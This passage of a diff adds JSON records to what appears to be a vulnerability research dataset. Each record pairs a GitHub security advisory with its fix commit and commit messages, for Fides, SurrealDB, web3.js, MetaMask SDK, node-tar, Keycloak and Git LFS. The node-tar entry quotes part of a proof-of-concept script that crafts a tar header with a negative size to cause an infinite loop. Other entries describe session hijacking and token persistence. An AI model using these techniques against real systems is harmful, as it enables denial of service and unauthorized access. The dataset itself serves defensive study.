+        "CVE-2025-57817"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-862"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2025-09-08T22:15:33Z"
+      },
+      "affected_packages": [
+        {
+          "name": "ethyca-fides",
+          "ecosystem": "PyPI"
+        }
+      ],
+      "refs": [
+        "https://github.com/ethyca/fides/security/advisories/GHSA-hjfh-p8f5-24wr",
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-57817",
+        "https://github.com/ethyca/fides/commit/2ffd125e1089a09b84c27fb5279a05960cbf2452",
+        "https://github.com/ethyca/fides",
+        "https://github.com/ethyca/fides/releases/tag/2.69.1"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/ethyca__fides",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "59903c195e2f9f8915a1db94950aefd557033a5c\n64ce86a15ced6f3aa563573ed5ac954f6a178c80\nMerge commit from fork\n\n* formatting\n\n* slowapi to use same redis connection pool as app\n\n* feat: temporary modification to spin up two local webservers\n\n* adds connection_url_encoded field to Redis config\n\n* unencode redis pw for slowapi\n\n* actually using unencoded pass\n\n* reverse logic to add rate limiting middleware\n\n* feat: add enhanced nginx logging\n\n* refactor rate limiting into 2 shared buckets, add validation for insecure rate limit headers\n\n* explicit annotations for rate limiting buckets\n\n* adds missing annotations to endpoints\n\n* adds annotations to health endpoints\n\n* refactor: make nginx optional in nox -s dev\n\n* refactor: restructure docker-compose and nox dev session for single/nginx modes\n\n* fix: re-add mistaken removed env vars from fides service\n\n* fix: revert other changes unrelated to nginx\n\n* Revert \"adds annotations to health endpoints\"\n\nThis reverts commit af5659cf2e5b9c57a61581ee2636a9b24d964f60.\n\n* Revert \"adds missing annotations to endpoints\"\n\nThis reverts commit f69150d7bd7d1d4f131f71c56ac5f03f95fad3e6.\n\n* Revert \"explicit annotations for rate limiting buckets\"\n\nThis reverts commit d849d82bab73b88f29c3677f7fa3846ececb09fd.\n\n* remove public req rate limit env var, implement shared bucket\n\n* address CR feedback, notably adding custom exception handler for rate limit hit, and adding clean_ip logic to better handle various use cases\n\n* use existing lib to help parse ip\n\n* restricts ip validation to only one ip address and possibly a port, no handling of special characters\n\n* Adds changelog\n\n* adds safe and unsafe ip header extraction such that we do not throw errors from the key_func\n\n* fix improts\n\n* update env var usage\n\n---------\n\nCo-authored-by: Dave Quinlan <83430497+daveqnet@users.noreply.github.com>\n",
+    "fix_msg": "2ffd125e1089a09b84c27fb5279a05960cbf2452\n59903c195e2f9f8915a1db94950aefd557033a5c\nMerge commit from fork\n\n* working fix\n\n* tests and lint fixes\n\n* address code duplication\n\n* updates per code review\n\n* Update CHANGELOG.md\n\n* remove uncessary #pylint exception\n\n* use constant instead of string for storage:read\n\n* fix - should return 403 not 422\n\n* move changelog entries\n\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "64ce86a15ced6f3aa563573ed5ac954f6a178c80"
+    ],
+    "fix_parents": [
+      "59903c195e2f9f8915a1db94950aefd557033a5c"
+    ]
+  },
+  {
+    "case_id": "GHSA-RPW8-82V9-3Q87",
+    "repository": "ethyca/fides",
+    "fix_ref": "8daec4f5ad3daf0f0bdab4814f6757eb0965104b",
+    "ai_ancestor": "59903c195e2f9f8915a1db94950aefd557033a5c",
+    "subject": "Merge commit from fork",
+    "published": "2025-09-08T20:05:19Z",
+    "overlap_files": [
+      "CHANGELOG.md",
+      "src/fides/api/api/v1/endpoints/user_endpoints.py"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2025/09/GHSA-rpw8-82v9-3q87/GHSA-rpw8-82v9-3q87.json",
+    "advisory": {
+      "id": "GHSA-rpw8-82v9-3q87",
+      "summary": "Fides' Admin UI User Password Change Does Not Invalidate Current Session",
+      "details": "### Summary\n\nAdmin UI user password changes in Fides do not invalidate active user sessions, creating a vulnerability chaining opportunity where attackers who have obtained session tokens through other attack vectors (such as XSS) can maintain access even after password reset. This issue is not directly exploitable on its own and requires a prerequisite vulnerability to obtain valid session tokens in the first place.\n\n### Details\n\nFides uses encrypted authentication tokens with extended expiration periods. When a password is changed via password reset endpoints, the system updates the password hash in the database but does not invalidate existing client sessions or tokens. The authentication system validates tokens based on their cryptographic integrity and expiration time, not against the current password state.\n\nThe frontend application stores authentication state in browser local storage, which persists across browser sessions until explicit logout or natural token expiration.\n\nThis behavior alone does not constitute a directly exploitable vulnerability. The security issue only becomes exploitable when chained with other vulnerabilities or conditions that allow attackers to obtain valid session tokens, such as:\n\n- Cross-Site Scripting (XSS) attacks that can access browser storage where tokens are stored\n- Session hijacking through network interception\n- Malware on the user's device that can read browser storage\n- Physical device access where attackers can access browser storage directly\n\n### Impact\n\nThis vulnerability serves as a persistence mechanism in attack chains rather than a primary attack vector. When chained with token theft vulnerabilities, it allows attackers to:\n\n- Maintain access beyond the remediation window when users change passwords in response to su",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N/E:U"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2025-57766"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-613"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2025-09-08T22:15:33Z"
+      },
+      "affected_packages": [
+        {
+          "name": "ethyca-fides",
+          "ecosystem": "PyPI"
+        }
+      ],
+      "refs": [
+        "https://github.com/ethyca/fides/security/advisories/GHSA-rpw8-82v9-3q87",
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-57766",
+        "https://github.com/ethyca/fides/commit/8daec4f5ad3daf0f0bdab4814f6757eb0965104b",
+        "https://github.com/ethyca/fides",
+        "https://github.com/ethyca/fides/releases/tag/2.69.1"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/ethyca__fides",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "59903c195e2f9f8915a1db94950aefd557033a5c\n64ce86a15ced6f3aa563573ed5ac954f6a178c80\nMerge commit from fork\n\n* formatting\n\n* slowapi to use same redis connection pool as app\n\n* feat: temporary modification to spin up two local webservers\n\n* adds connection_url_encoded field to Redis config\n\n* unencode redis pw for slowapi\n\n* actually using unencoded pass\n\n* reverse logic to add rate limiting middleware\n\n* feat: add enhanced nginx logging\n\n* refactor rate limiting into 2 shared buckets, add validation for insecure rate limit headers\n\n* explicit annotations for rate limiting buckets\n\n* adds missing annotations to endpoints\n\n* adds annotations to health endpoints\n\n* refactor: make nginx optional in nox -s dev\n\n* refactor: restructure docker-compose and nox dev session for single/nginx modes\n\n* fix: re-add mistaken removed env vars from fides service\n\n* fix: revert other changes unrelated to nginx\n\n* Revert \"adds annotations to health endpoints\"\n\nThis reverts commit af5659cf2e5b9c57a61581ee2636a9b24d964f60.\n\n* Revert \"adds missing annotations to endpoints\"\n\nThis reverts commit f69150d7bd7d1d4f131f71c56ac5f03f95fad3e6.\n\n* Revert \"explicit annotations for rate limiting buckets\"\n\nThis reverts commit d849d82bab73b88f29c3677f7fa3846ececb09fd.\n\n* remove public req rate limit env var, implement shared bucket\n\n* address CR feedback, notably adding custom exception handler for rate limit hit, and adding clean_ip logic to better handle various use cases\n\n* use existing lib to help parse ip\n\n* restricts ip validation to only one ip address and possibly a port, no handling of special characters\n\n* Adds changelog\n\n* adds safe and unsafe ip header extraction such that we do not throw errors from the key_func\n\n* fix improts\n\n* update env var usage\n\n---------\n\nCo-authored-by: Dave Quinlan <83430497+daveqnet@users.noreply.github.com>\n",
+    "fix_msg": "8daec4f5ad3daf0f0bdab4814f6757eb0965104b\n0727870748c0a04c83b26098f7f30e97c61ee358\nENG-681 Re implement pw reset session invalidation (#6526)\n\n\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "64ce86a15ced6f3aa563573ed5ac954f6a178c80"
+    ],
+    "fix_parents": [
+      "0727870748c0a04c83b26098f7f30e97c61ee358"
+    ]
+  },
+  {
+    "case_id": "GHSA-5QFP-32CF-69JH",
+    "repository": "surrealdb/surrealdb",
+    "fix_ref": "fd800fc7c55afcdc97057d18cf7cb7f83557e702",
+    "ai_ancestor": "e9dc863530caf1880561e5140e92aea4cb2b6106",
+    "subject": "Update dependencies (#16)",
+    "published": "2026-07-01T20:00:17Z",
+    "overlap_files": [
+      "Cargo.lock",
+      "Cargo.toml"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2026/07/GHSA-5qfp-32cf-69jh/GHSA-5qfp-32cf-69jh.json",
+    "advisory": {
+      "id": "GHSA-5qfp-32cf-69jh",
+      "summary": "SurrealDB: HTTP /rpc `sessions` method leaks attached session UUIDs, enabling full session hijack by anonymous callers",
+      "details": "The HTTP `/rpc` `sessions` method returned every attached session UUID without authentication, and the `/rpc` handler accepted an arbitrary `session` field with no ownership check. An anonymous caller could enumerate UUIDs and impersonate any authenticated session.\n\n\"Attached\" means sessions registered via `{\"method\":\"attach\"}` \u2014 the only writer to the HTTP session map. Ordinary stateless `/rpc` requests use ephemeral per-request sessions that are filtered from `sessions()` and destroyed at end-of-request, so they are not enumerable.\n\n### Exposure\n\n- **Exposed:** clients that issue `attach`, notably the official Rust SDK's `Http`/`Https` engine (auto-attaches once per `Surreal` handle).\n- **Not exposed:** REST endpoints (`/sql`, `/key`, `/signin`, `/export`, etc.); WebSocket `/rpc` (per-connection scope, `attach` refused); embedded / MCP usage; ad-hoc `POST /rpc` callers that never `attach`.\n\n### Impact\n\nFor each **attached and authenticated** session, an unauthenticated attacker can read, write, and delete any data the session can reach, dump metadata, invalidate sessions, and escalate to that session's privilege level (up to root). An attached session that has not yet authenticated is `Level::No` and confers no privilege.\n\n### Patches\n\n1. HTTP `sessions()` now returns `method_not_allowed`. WebSocket retains per-connection enumeration.\n2. The HTTP `/rpc` handler gates client-supplied session IDs against the caller's request-level auth principal (actor id + level); mismatches return `session_not_found`.\n3. Attached HTTP sessions are capped via `SURREAL_HTTP_MAX_ATTACHED_SESSIONS`.\n\nVersions 3.1.0 and later are not affected.\n\n### Workarounds\n\nNo configuration-level mitigation fully addresses this. For Users unable to upgrade:\n\n- Avoid SDKs and client flows that call `att",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-384"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": null
+      },
+      "affected_packages": [
+        {
+          "name": "surrealdb",
+          "ecosystem": "crates.io"
+        }
+      ],
+      "refs": [
+        "https://github.com/surrealdb/surrealdb/security/advisories/GHSA-5qfp-32cf-69jh",
+        "https://github.com/surrealdb/surrealdb/commit/fd800fc7c55afcdc97057d18cf7cb7f83557e702",
+        "https://github.com/surrealdb/surrealdb"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/surrealdb__surrealdb",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "e9dc863530caf1880561e5140e92aea4cb2b6106\n36f0a41a69b551172c7d1d13b1e8dbbd868e2ead\nUpdate dependencies (#16)\n\nCo-authored-by: Stu Schwartz <stu.schwartz@surrealdb.com>\n",
+    "fix_msg": "fd800fc7c55afcdc97057d18cf7cb7f83557e702\ne9dc863530caf1880561e5140e92aea4cb2b6106\nFix RPC session leak vulnerability (#22)\n\n\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "36f0a41a69b551172c7d1d13b1e8dbbd868e2ead"
+    ],
+    "fix_parents": [
+      "e9dc863530caf1880561e5140e92aea4cb2b6106"
+    ]
+  },
+  {
+    "case_id": "GHSA-HHF6-3XPG-PGGX",
+    "repository": "web3/web3.js",
+    "fix_ref": "d9660426c12210c5071aeb4e1a647c6ea9d67b12",
+    "ai_ancestor": "f60b9191a88c0e72c44533d832bdecb88f3d93a9",
+    "subject": "Fix odd length hex string conversion (#5086)",
+    "published": "2025-09-24T21:30:37Z",
+    "overlap_files": [
+      "packages/web3-utils/src/converters.ts",
+      "packages/web3-utils/test/fixtures/converters.ts"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2025/09/GHSA-hhf6-3xpg-pggx/GHSA-hhf6-3xpg-pggx.json",
+    "advisory": {
+      "id": "GHSA-hhf6-3xpg-pggx",
+      "summary": "web3-core-subscriptions has a Prototype Pollution vulnerability",
+      "details": "The web3-core-subscriptions is a package designed to manages web3 subscriptions. A Prototype Pollution vulnerability in the attachToObject function of web3-core-subscriptions version 1.10.4 and before allows attackers to inject properties on Object.prototype via supplying a crafted payload, causing denial of service (DoS) as the minimum consequence.",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2025-57330"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-1321"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2025-09-24T19:15:39Z"
+      },
+      "affected_packages": [
+        {
+          "name": "web3-core-subscriptions",
+          "ecosystem": "npm"
+        }
+      ],
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-57330",
+        "https://github.com/web3/web3.js/commit/d9660426c12210c5071aeb4e1a647c6ea9d67b12",
+        "https://github.com/VulnSageAgent/PoCs/blob/main/JavaScript/prototype-pollution/web3-core-subscriptions%401.10.4/index.js",
+        "https://github.com/VulnSageAgent/PoCs/tree/main/JavaScript/prototype-pollution/CVE-2025-57330",
+        "https://github.com/web3/web3.js"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/web3__web3.js",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "f60b9191a88c0e72c44533d832bdecb88f3d93a9\nf94157e11b54f3a9eeb700c2a92370ce9478635e\nFix odd length hex string conversion (#5086)\n\n* Fix odd length hex string conversion\n\n* Support not prefixed hex strings\n\n* Support capital prefix\n\n* Add unit tests\n\n* Refactor code\n\n* Add more testcases\n\nCo-authored-by: Oleksii Kosynskyi <oleksii.kosynskyi@gmail.com>\n",
+    "fix_msg": "d9660426c12210c5071aeb4e1a647c6ea9d67b12\nf60b9191a88c0e72c44533d832bdecb88f3d93a9\n:art: Improve the nullish value usage around the codebase (#5095)\n\n* :art: Update the usage of \"null\" around the codebase\n\n* :art: Update value check to avoid prototype pollution\n\n* :rotating_light: Fix all lint errors for null values\n\n* :rotating_light: Add linting rules\n\n* :art: Update json-rpc \"null\" validation\n\n* :art: Update the legacy provider error type to accept \"null\"\n\n* Apply suggestions from code review\n\nCo-authored-by: Junaid <86780488+jdevcs@users.noreply.github.com>\n\n* :art: Improve the tests to make sure transaction complete in each test case\n\nCo-authored-by: Junaid <86780488+jdevcs@users.noreply.github.com>\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "f94157e11b54f3a9eeb700c2a92370ce9478635e"
+    ],
+    "fix_parents": [
+      "f60b9191a88c0e72c44533d832bdecb88f3d93a9"
+    ]
+  },
+  {
+    "case_id": "GHSA-QJ3P-XC97-XW74",
+    "repository": "MetaMask/metamask-sdk",
+    "fix_ref": "baa185c6cfa97755a3d389d956372ad9eb37c4a4",
+    "ai_ancestor": "12479bef28ca96496a8153579e94a7a1bdaa8edd",
+    "subject": "Add New Analytics Client (#1270)",
+    "published": "2025-09-15T13:55:56Z",
+    "overlap_files": [
+      "package.json",
+      "yarn.lock"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2025/09/GHSA-qj3p-xc97-xw74/GHSA-qj3p-xc97-xw74.json",
+    "advisory": {
+      "id": "GHSA-qj3p-xc97-xw74",
+      "summary": "MetaMask SDK indirectly exposed via malicious debug@4.4.2 dependency",
+      "details": "### Who is affected?\nThis advisory only applies to developers who use MetaMask SDK in the browser and who, on Sept 8th 2025 between 13:00\u201315:30 UTC, performed one of the following actions and then deployed their application:\n- Installed MetaMask SDK into a project with a lockfile for the first time\n- Installed MetaMask SDK in a project without a lockfile\n- Updated a lockfile to pull in `debug@4.4.2` (e.g., via `npm update` or `yarn upgrade`)\n\n### What happened?\nOn Sept 8th, 2025 (13:00\u201315:30 UTC), a malicious version of the `debug` package (v4.4.2) was published to npm. The injected code attempts to interfere with dApp-to-wallet communication when executed in a browser context. \n\nWhile MetaMask SDK itself was not directly impacted, projects installing the SDK during this window may have inadvertently pulled in the malicious version of `debug`.\n\n### Mitigation\n- If your application was rebuilt and redeployed after Sept 8th, 2025, 15:30 UTC, the malicious version of debug should no longer be present. Please also verify that your package manager (npm, yarn, pnpm, etc.) is not caching `debug@4.4.2`.\n- If you have not yet deployed since performing one of the actions above, delete your `node_modules` and reinstall dependencies before deploying.\n- If your application was deployed during the attack window and has not been rebuilt since, perform a clean install of dependencies and redeploy to ensure the malicious package is removed.\n\n### Resources\n[GitHub Advisory for debug](https://github.com/advisories/GHSA-8mgj-vmr8-frr6)",
+      "severity": [],
+      "withdrawn_at": null,
+      "aliases": [],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-506"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": null
+      },
+      "affected_packages": [
+        {
+          "name": "@metamask/sdk",
+          "ecosystem": "npm"
+        },
+        {
+          "name": "@metamask/sdk-react",
+          "ecosystem": "npm"
+        },
+        {
+          "name": "@metamask/sdk-communication-layer",
+          "ecosystem": "npm"
+        }
+      ],
+      "refs": [
+        "https://github.com/MetaMask/metamask-sdk/security/advisories/GHSA-qj3p-xc97-xw74",
+        "https://github.com/MetaMask/metamask-sdk/pull/1342",
+        "https://github.com/MetaMask/metamask-sdk/commit/baa185c6cfa97755a3d389d956372ad9eb37c4a4",
+        "https://github.com/MetaMask/metamask-sdk"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/MetaMask__metamask-sdk",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "12479bef28ca96496a8153579e94a7a1bdaa8edd\n7bf76cb92540b657f7027ffb6ee9569370750783\nAdd New Analytics Client (#1270)\n\n* add analytics client\n\n* refactor + added tests\n\n* tidy\n\n* fix: integrate standard eslint rules and add tsup to export types, cjs version\n\n* fix: prevent schemas.ts from being linted\n\n* fix: apply most linter suggestions\n\n* fix: add default env variable for Analytics endpoint + remove default export\n\n---------\n\nCo-authored-by: Javier Ribo\u0301 <javi.ribo@consensys.net>\n",
+    "fix_msg": "baa185c6cfa97755a3d389d956372ad9eb37c4a4\n5715f4735b9e70aebc1783d2dd68a599301e3009\nchore: pin `debug` package to exact version due to npm compromise (#1342)\n\n* chore: lock debug package to exact version due to npm compromise\n\n* lock debug package to exact version due to npm compromise in all packages\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "7bf76cb92540b657f7027ffb6ee9569370750783"
+    ],
+    "fix_parents": [
+      "5715f4735b9e70aebc1783d2dd68a599301e3009"
+    ]
+  },
+  {
+    "case_id": "GHSA-8X88-C5MF-7J5W",
+    "repository": "isaacs/node-tar",
+    "fix_ref": "9e78bf058b2c22dd4d52e00d8922d5c06fc2f7b5",
+    "ai_ancestor": "21a822027658c8063542be330530bbecdf0dbbfe",
+    "subject": "do not apply PAX header fields to meta entries",
+    "published": "2026-07-20T21:51:39Z",
+    "overlap_files": [
+      "src/header.ts",
+      "test/header.js"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2026/07/GHSA-8x88-c5mf-7j5w/GHSA-8x88-c5mf-7j5w.json",
+    "advisory": {
+      "id": "GHSA-8x88-c5mf-7j5w",
+      "summary": "node-tar: Negative tar entry size causes infinite loop in archive replace",
+      "details": "### Summary\n\nA checksum-valid tar archive with a negative base-256 encoded entry size can make `tar.replace()` loop forever while scanning the existing archive. Applications that update attacker-controlled tar archives can have a worker process pinned indefinitely, causing denial of service.\n\n### Details\n\nThe public `tar.replace()` API scans the existing archive before appending replacement entries. During this scan, it parses each tar header and advances the archive position by the parsed entry size rounded to a 512-byte block boundary.\n\nTar supports base-256 encoded numeric fields. A crafted header can encode the entry size as `-512` while still carrying a valid checksum. The replace scan accepts that parsed negative size and uses it in the position-advance calculation.\n\nFor a size of `-512`, the computed body skip is `-512`. The scan then adds the normal 512-byte header step, resulting in no net progress. The scanner repeatedly parses the same header forever and never reaches the append step.\n\nThis is reachable through the supported package API when the existing archive file is attacker controlled. It does not rely on extraction, dependency behavior, or an uncaught exception.\n\n### PoC\n\nSave as `poc.mjs` in a project with the vulnerable package installed and run:\n\n```bash\nnode poc.mjs\n```\n\n```js\nimport fs from 'node:fs'\nimport os from 'node:os'\nimport path from 'node:path'\nimport { spawnSync } from 'node:child_process'\n\nconst oct = (b, n, off, len) =>\n  b.write(n.toString(8).padStart(len - 1, '0') + '\\0', off, len, 'ascii')\n\nconst badHeader = () => {\n  const h = Buffer.alloc(512)\n\n  h.write('x', 0)\n  oct(h, 0o644, 100, 8)\n  oct(h, 0, 108, 8)\n  oct(h, 0, 116, 8)\n\n  // base-256 encoded -512 in the size field\n  Buffer.alloc(10, 0xff).copy(h, 124)\n  h[134] = 0xfe\n  h[135]",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2026-59874"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-835"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2026-07-08T16:16:33Z"
+      },
+      "affected_packages": [
+        {
+          "name": "tar",
+          "ecosystem": "npm"
+        }
+      ],
+      "refs": [
+        "https://github.com/isaacs/node-tar/security/advisories/GHSA-8x88-c5mf-7j5w",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-59874",
+        "https://github.com/isaacs/node-tar/commit/9e78bf058b2c22dd4d52e00d8922d5c06fc2f7b5",
+        "https://github.com/isaacs/node-tar",
+        "https://github.com/isaacs/node-tar/releases/tag/v7.5.18"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/isaacs__node-tar",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "21a822027658c8063542be330530bbecdf0dbbfe\n52632cf38fdbdbbc7ab86184d68a85b11fdb0970\ndo not apply PAX header fields to meta entries\n\nA PAX extended header (x/g) describes the *next file entry*, per POSIX\npax, not the GNU long-name (L) / long-link (K) or further PAX (x/g)\nheaders that may sit between it and that file. Header.decode previously\napplied the pending ex/gex overrides (notably size) to whatever header\nwas decoded next, including those intermediary extension headers. A\ncrafted stream ordered x(size=N) -> L -> file would advance the cursor\nby N for the L header instead of by L's true payload length,\ndesynchronizing the parser relative to GNU tar, libarchive, Python\ntarfile and the (now-fixed) Rust tar crates. This is a tar\ninterpretation-conflict / file-smuggling primitive (CWE-436).\n\nOnly apply extended headers to entries that represent known filesystem\nentry types.\n\nEDIT(@isaacs):\n\n- Added test\n- Updated block-list of meta types to allow-list of fs types.\n\nFix: GHSA-vmf3-w455-68vh\n\n",
+    "fix_msg": "9e78bf058b2c22dd4d52e00d8922d5c06fc2f7b5\ne02a4e9e013c4be95302e2eb2047a942b883c27b\nrefuse to let header size be less than 0\n\nfix: https://github.com/isaacs/node-tar/security/advisories/GHSA-8x88-c5mf-7j5w\n\n",
+    "is_ancestor": true,
+    "ai_marker": [
+      "Cursor"
+    ],
+    "ancestor_parents": [
+      "52632cf38fdbdbbc7ab86184d68a85b11fdb0970"
+    ],
+    "fix_parents": [
+      "e02a4e9e013c4be95302e2eb2047a942b883c27b"
+    ]
+  },
+  {
+    "case_id": "GHSA-83C4-FFJP-MXP9",
+    "repository": "keycloak/keycloak",
+    "fix_ref": "b6cd645683f469724cd588fac415fe09bd20a27a",
+    "ai_ancestor": "3bf29d5a6175ea7759618d4f87223c53b5a1f26b",
+    "subject": "Unhandled NPE with alg:none JWT in Bearer Authentication",
+    "published": "2026-05-19T09:31:21Z",
+    "overlap_files": [
+      "services/src/main/java/org/keycloak/protocol/oidc/AccessTokenIntrospectionProvider.java",
+      "services/src/main/java/org/keycloak/protocol/oidc/endpoints/UserInfoEndpoint.java"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2026/05/GHSA-83c4-ffjp-mxp9/GHSA-83c4-ffjp-mxp9.json",
+    "advisory": {
+      "id": "GHSA-83c4-ffjp-mxp9",
+      "summary": "Keycloak: Revoked Tokens Can Remain Active When Both Realm-Level and Client-Level `notBefore` Revocation Policies are Configured",
+      "details": "A flaw was found in Keycloak. When both realm-level and client-level `notBefore` revocation policies are configured, Keycloak's OpenID Connect (OIDC) Introspection feature fails to properly honor the realm-level policy. This allows tokens that should have been revoked to remain active, potentially leading to unauthorized access or continued session validity. This could impact the security of systems utilizing Keycloak for identity and access management.",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2026-8922"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-303"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2026-05-19T08:16:18Z"
+      },
+      "affected_packages": [
+        {
+          "name": "org.keycloak:keycloak-services",
+          "ecosystem": "Maven"
+        }
+      ],
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-8922",
+        "https://github.com/keycloak/keycloak/issues/49118",
+        "https://github.com/keycloak/keycloak/pull/49129",
+        "https://github.com/keycloak/keycloak/commit/b6cd645683f469724cd588fac415fe09bd20a27a",
+        "https://github.com/keycloak/keycloak/commit/c5bda802e98b412e42fa62ff6240669e9ea4a858",
+        "https://access.redhat.com/errata/RHSA-2026:25097",
+        "https://access.redhat.com/errata/RHSA-2026:25098",
+        "https://access.redhat.com/errata/RHSA-2026:30049",
+        "https://access.redhat.com/errata/RHSA-2026:30050",
+        "https://access.redhat.com/security/cve/CVE-2026-8922",
+        "https://bugzilla.redhat.com/show_bug.cgi?id=2479586",
+        "https://github.com/keycloak/keycloak"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/keycloak__keycloak",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "3bf29d5a6175ea7759618d4f87223c53b5a1f26b\n17dd9f183a3b034f53965a6b0106b91f4b736f65\nUnhandled NPE with alg:none JWT in Bearer Authentication\n\n* Unhandled NPE with alg:none JWT in Bearer Authentication\n\nCloses #48744\n\n(cherry picked from commit 1e99746a68c0990f2de8cb60a7dbf3a12fa94f12)\n\nSigned-off-by: Martin Barto\u0161 <mabartos@redhat.com>\nCo-authored-by: Ricardo Martin <rmartinc@redhat.com>\n",
+    "fix_msg": "b6cd645683f469724cd588fac415fe09bd20a27a\nc15bcccf7b80cc15dde6ca027c87b66abc340896\nfix not before validation\n\nCloses #49118\n\n\n(cherry picked from commit c5bda80)\n\nSigned-off-by: Giuseppe Graziano <g.graziano94@gmail.com>\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "17dd9f183a3b034f53965a6b0106b91f4b736f65"
+    ],
+    "fix_parents": [
+      "c15bcccf7b80cc15dde6ca027c87b66abc340896"
+    ]
+  },
+  {
+    "case_id": "GHSA-6PVW-G552-53C5",
+    "repository": "git-lfs/git-lfs",
+    "fix_ref": "0cffe93176b870055c9dadbb3cc9a4a440e98396",
+    "ai_ancestor": "4b25800ecc81089765f14416637ee396da2d586f",
+    "subject": "t: add shell tests with pointer extension program",
+    "published": "2025-10-17T17:05:03Z",
+    "overlap_files": [
+      "t/t-checkout.sh",
+      "t/t-pull.sh"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2025/10/GHSA-6pvw-g552-53c5/GHSA-6pvw-g552-53c5.json",
+    "advisory": {
+      "id": "GHSA-6pvw-g552-53c5",
+      "summary": "Git LFS may write to arbitrary files via crafted symlinks",
